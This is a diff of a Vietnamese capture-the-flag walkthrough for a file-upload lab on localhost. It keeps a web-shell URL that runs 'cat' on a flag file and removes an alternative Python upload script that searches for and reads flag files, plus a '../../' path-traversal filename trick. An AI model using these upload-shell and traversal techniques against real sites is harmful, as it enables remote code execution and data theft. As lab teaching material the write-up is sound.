@@ -141,47 +141,6 @@ http://localhost:5006/uploads/shell.php?cmd=cat%20/app/flag.txt
 ### Flag
 
 `FLAG{upl0ad_php_sh3ll_and_rc3_1s_fun!}`
-```
-
-2. Upload file `shell.py` qua giao diện web
-
-3. Truy cập: `http://localhost:5000/uploads/shell.py`
-
-**Cách 2: Upload file RCE đơn giản**
-
-1. Tạo file `rce.py`:
-```python
-import subprocess
-import sys
-
-print("Content-Type: text/html\n")
-print("<html><body>")
-print("<h2>Remote Code Execution</h2>")
-
-# Tìm flag file
-result = subprocess.run(['find', '/', '-name', '*flag*'], 
-                       capture_output=True, text=True, timeout=5)
-print("<h3>Files with 'flag' in name:</h3>")
-print("<pre>" + result.stdout + "</pre>")
-
-# Đọc flag
-result = subprocess.run(['cat', '/tmp/flag.txt'], 
-                       capture_output=True, text=True)
-print("<h3>Flag content:</h3>")
-print("<pre>" + result.stdout + "</pre>")
-
-print("</body></html>")
-```
-
-2. Upload và truy cập file
-
-**Cách 3: Path Traversal (nếu có)**
-
-Thử upload file với tên như `../../tmp/test.py` để ghi file vào vị trí khác.
-
-### Flag
-
-`FLAG{upl0ad_php_sh3ll_and_rc3_1s_fun!}`
 
 </details>
 
